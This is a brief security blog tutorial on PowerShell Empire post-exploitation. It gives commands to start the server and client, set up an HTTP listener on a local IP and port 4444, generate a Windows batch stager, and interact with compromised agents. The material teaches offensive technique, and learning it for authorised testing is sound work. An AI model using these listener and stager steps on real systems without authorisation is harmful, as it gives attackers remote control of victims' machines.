# Welcome to Cyber Secure Labs
Public Site for sharing security writes




## Post Exploitation 



### Working with Powershell Empire 

Empire is a “PowerShell and Python post-exploitation agent” with a heavy focus on client-side

exploitation and post-exploitation of Active Directory (AD) deployments.


Windows Platform: Exploitation and post exploits are performed using Powershell.


Linux & macOS: Exploitation requires Python 2.6 or 2.7



In the latest version of Powershell Empire comes with a cleint-server model.

To start the server, the command is below: 

```
sudo powershell-empire server
```

To start the client, the command is below: 

```
sudo powershell-empire client
```

After starting both the client an server, the methodology used to carry out an attack are as follows:

1. Start a Listener 
2. Start a Stager
3. Listing the Agents
4. Interact with the agents
5. Run Post Exploitation commands

### Setting up a listener:

```
use Listener http

set Name test

set Host 192.168.119.208

set Port 4444

execute

```

### Setting up a stager:


```
usestager windows/launcher_bat

set Listener test

execute

```


### Setting up a stager:

```
agents
```

### Interacting with an agent

```
interact S2PRDACB
```

### Post Exploitation Commands:

```
info
```
